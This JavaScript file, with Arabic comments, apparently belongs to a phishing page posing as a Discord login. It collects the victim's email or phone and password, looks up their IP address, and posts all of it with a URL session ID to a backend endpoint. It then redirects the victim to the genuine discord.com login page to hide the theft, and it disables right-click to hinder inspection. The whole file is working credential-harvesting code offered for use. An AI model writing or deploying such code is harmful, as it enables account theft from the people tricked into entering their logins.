// لا نحتاج إلى استيراد Firebase لأننا سنستخدم واجهة API

const emailInput = document.getElementById('emailORphone');
const passwordInput = document.getElementById('password');
const loginForm = document.querySelector('form');

function getSessionId() {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('session');
}

async function sendLoginCredentials(email, password) {
    try {
        const sessionId = getSessionId();
        
        if (!sessionId) {
            console.error("لا يوجد معرف جلسة");
            return false;
        }
        
        // الحصول على عنوان IP
        let ip = 'غير معروف';
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            ip = ipData.ip;
        } catch (error) {
            console.error("خطأ في الحصول على عنوان IP:", error);
        }
        
        // استخدام واجهة API لتسجيل الدخول
        const response = await fetch('/api/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                email: email,
                password: password,
                sessionId: sessionId,
                ip: ip
            })
        });
        
        const result = await response.json();
        if (!result.success) {
            console.error("خطأ في تسجيل الدخول:", result.error);
        }
        
        console.log("تم إرسال البيانات بنجاح");
        return true;
    } catch (error) {
        console.error("خطأ في إرسال البيانات:", error);
        return false;
    }
}

function animateLoginButton() {
    const loginBtn = document.querySelector('.login button');
    const originalText = loginBtn.innerHTML;
    loginBtn.innerHTML = '<span class="spinner"></span>';
    loginBtn.disabled = true;
    
    return function resetButton() {
        loginBtn.innerHTML = originalText;
        loginBtn.disabled = false;
    };
}

if (loginForm) {
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const email = emailInput.value.trim();
        const password = passwordInput.value.trim();
        
        if (!email || !password) {
            alert('الرجاء إدخال البريد الإلكتروني وكلمة المرور');
            return;
        }
        
        const resetButton = animateLoginButton();
        
        try {
            const success = await sendLoginCredentials(email, password);
            
            if (success) {
                setTimeout(function() {
                    window.location.href = 'https://discord.com/login';
                }, 2000);
            } else {
                resetButton();
                alert('حدث خطأ أثناء تسجيل الدخول. الرجاء المحاولة مرة أخرى.');
            }
        } catch (error) {
            console.error("خطأ:", error);
            resetButton();
            alert('حدث خطأ أثناء تسجيل الدخول. الرجاء المحاولة مرة أخرى.');
        }
    });
}

document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
});
window.onload = function() {
    const sessionId = getSessionId();
    console.log("معرف الجلسة:", sessionId);
    
    if (sessionId) {
        console.log("تم العثور على معرف الجلسة:", sessionId);
    } else {
        console.error("لا يوجد معرف جلسة في الرابط!");
    }
};
